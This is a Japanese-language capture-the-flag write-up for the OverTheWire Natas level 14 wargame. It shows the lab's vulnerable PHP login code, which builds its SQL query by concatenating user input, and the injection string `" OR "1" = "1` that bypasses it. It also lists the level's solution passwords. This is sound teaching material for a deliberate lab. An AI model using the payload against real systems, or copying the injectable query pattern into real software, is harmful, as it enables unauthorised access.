# Natas14
```
Username: natas14
Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
URL:      http://natas14.natas.labs.overthewire.org
```
IDとPWを入れてログインするページ。  
とりあえず`View sourcecode`
```
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```

SQLを使用しているので、SQLインジェクションを試す  

`" OR "1" = "1`をUnsernameとPasswordに入力してLoginを押す。  
そうするとログインできる。

[何が起きているのか？]  
`" OR "1" = "1`  
と入力すると、  
`username="" OR "1" = "1"`  
となり、 「usernameが""(値なし)と同じ、もしくは1=1であれば合っている」という処理になっている。

```
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```